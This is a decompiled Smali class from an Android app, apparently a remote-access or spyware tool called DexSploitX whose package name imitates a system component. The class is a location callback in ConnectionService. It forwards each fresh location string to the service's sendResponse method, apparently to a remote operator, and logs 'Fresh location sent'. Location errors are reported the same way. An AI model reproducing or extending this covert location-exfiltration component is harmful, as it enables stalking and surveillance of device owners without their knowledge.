.class Lcom/system/DroidX/ConnectionService$3;
.super Ljava/lang/Object;
.source "ConnectionService.java"

# interfaces
.implements Lcom/system/DroidX/utils/LocationHelper$LocationCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/system/DroidX/ConnectionService;->getUnifiedLocation()Ljava/lang/String;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/system/DroidX/ConnectionService;


# direct methods
.method constructor <init>(Lcom/system/DroidX/ConnectionService;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 548
    iput-object p1, p0, Lcom/system/DroidX/ConnectionService$3;->this$0:Lcom/system/DroidX/ConnectionService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onLocationError(Ljava/lang/String;)V
    .locals 3

    .line 557
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService$3;->this$0:Lcom/system/DroidX/ConnectionService;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ERROR:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/system/DroidX/ConnectionService;->-$$Nest$msendResponse(Lcom/system/DroidX/ConnectionService;Ljava/lang/String;)V

    .line 558
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Location error: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "DexSploitX"

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public onLocationUpdate(Ljava/lang/String;)V
    .locals 2

    .line 551
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService$3;->this$0:Lcom/system/DroidX/ConnectionService;

    invoke-static {v0, p1}, Lcom/system/DroidX/ConnectionService;->-$$Nest$msendResponse(Lcom/system/DroidX/ConnectionService;Ljava/lang/String;)V

    .line 552
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Fresh location sent: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "DexSploitX"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method
